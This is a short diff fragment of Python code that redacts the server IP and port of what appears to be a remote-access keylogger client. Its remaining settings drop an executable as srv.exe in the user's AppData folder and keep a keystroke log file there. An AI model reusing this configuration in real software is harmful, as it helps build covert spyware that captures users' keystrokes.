@@ -20,8 +20,8 @@ import struct
 import platform
 #
 
-ServerIP = "192.168.56.106"
-ServerPort = 54321
+ServerIP = "192.168.XX.XXX"
+ServerPort = 5XXXX
 File_Location = os.environ["appdata"] + "\\srv.exe"
 ImageFile="./cat.jpg"
 kl_file=os.environ["appdata"] + "\\srv.txt"
